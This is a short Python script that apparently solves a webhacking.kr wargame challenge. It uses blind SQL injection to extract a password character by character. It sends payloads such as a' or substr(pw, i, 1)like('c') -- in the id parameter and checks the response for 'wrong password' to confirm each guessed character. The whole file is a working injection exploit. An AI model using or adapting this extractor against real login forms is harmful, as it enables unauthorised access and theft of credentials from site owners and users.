import requests
import string

URL = "https://webhacking.kr/challenge/bonus-1/index.php"


password = ""
params = {"id": "", "pw": "1"}
i = 1
while True:    
    for c in "_"+string.ascii_letters+string.digits+"{"+"}"+"-"+"?":
        payload = f"a' or substr(pw, {i}, 1)like('{c}') -- ".replace("_", r"\_")
        params["id"] = payload 
        response = requests.post(URL, params=params)
        if "wrong password" in response.text:
            if i == 1:
                c = 't'
            i += 1
            password += c
            print(password)
            break
    